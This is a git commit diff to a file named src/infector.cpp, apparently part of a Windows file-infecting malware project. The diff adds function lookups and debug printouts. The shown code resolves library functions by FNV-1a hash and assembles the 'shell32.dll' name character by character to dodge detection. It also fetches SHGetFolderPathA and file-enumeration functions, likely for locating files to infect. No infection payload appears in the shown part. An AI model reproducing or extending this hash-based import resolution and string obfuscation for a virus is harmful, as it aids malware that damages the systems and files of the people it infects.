e0ccd6f3f2b1b56686e40d053385197e5fdefc46
frank2 <frank2@dc949.org>
2023-12-27 18:35:05 -0800

    verify the functions

--- src/infector.cpp
+++ src/infector.cpp
@@ -144,21 +144,22 @@ void infect(void)
    reallocHeader realloc = reinterpret_cast<reallocHeader>(get_proc_by_hash(msvcrtModule, 0xbf26b345));
    freeHeader free = reinterpret_cast<freeHeader>(get_proc_by_hash(msvcrtModule, 0x99b3eedb));
    strncatHeader strncat = reinterpret_cast<strncatHeader>(get_proc_by_hash(msvcrtModule, 0xb1ee6f2e));
-   
+   memcpyHeader memcpy = reinterpret_cast<memcpyHeader>(get_proc_by_hash(msvcrtModule, 0xa45cec64));
    char shell32Dll[] = {'s','h','e','l','l','3','2','.','d','l','l',0};
    PIMAGE_DOS_HEADER shell32Module = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(shell32Dll));
+   SHGetFolderPathAHeader getFolderPath = reinterpret_cast<SHGetFolderPathAHeader>(get_proc_by_hash(shell32Module, 0xe8692330));
 
    std::wcout << "msvcrt: " << std::hex << (std::uintptr_t)msvcrtModule << std::endl;
    std::wcout << "shell32: " << std::hex << (std::uintptr_t)shell32Module << std::endl;
-   std::wcout << "malloc: " << std::hex << fnv321a("malloc") << std::endl;
-   std::wcout << "realloc: " << std::hex << fnv321a("realloc") << std::endl;
-   std::wcout << "free: " << std::hex << fnv321a("free") << std::endl;
-   std::wcout << "strncat: " << std::hex << fnv321a("strncat") << std::endl;
-   std::wcout << "strlen: " << std::hex << fnv321a("strlen") << std::endl;
-   std::wcout << "memcpy: " << std::hex << fnv321a("memcpy") << std::endl;
-   std::wcout << "FindFirstFileA: " << std::hex << fnv321a("FindFirstFileA") << std::endl;
-   std::wcout << "FindNextFileA: " << std::hex << fnv321a("FindNextFileA") << std::endl;
-   std::wcout << "SHGetFolderPathA: " << std::hex << fnv321a("SHGetFolderPathA") << std::endl;
+   std::wcout << "malloc: " << std::hex << (std::uintptr_t)malloc << std::endl;
+   std::wcout << "realloc: " << std::hex << (std::uintptr_t)realloc << std::endl;
+   std::wcout << "free: " << std::hex << (std::uintptr_t)free << std::endl;
+   std::wcout << "strncat: " << std::hex << (std::uintptr_t)strncat << std::endl;
+   std::wcout << "strlen: " << std::hex << (std::uintptr_t)strlen << std::endl;
+   std::wcout << "memcpy: " << std::hex << (std::uintptr_t)memcpy << std::endl;
+   std::wcout << "FindFirstFileA: " << std::hex << (std::uintptr_t)findFirstFile << std::endl;
+   std::wcout << "FindNextFileA: " << std::hex << (std::uintptr_t)findNextFile << std::endl;
+   std::wcout << "SHGetFolderPathA: " << std::hex << (std::uintptr_t)getFolderPath << std::endl;
 }
 
 int wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
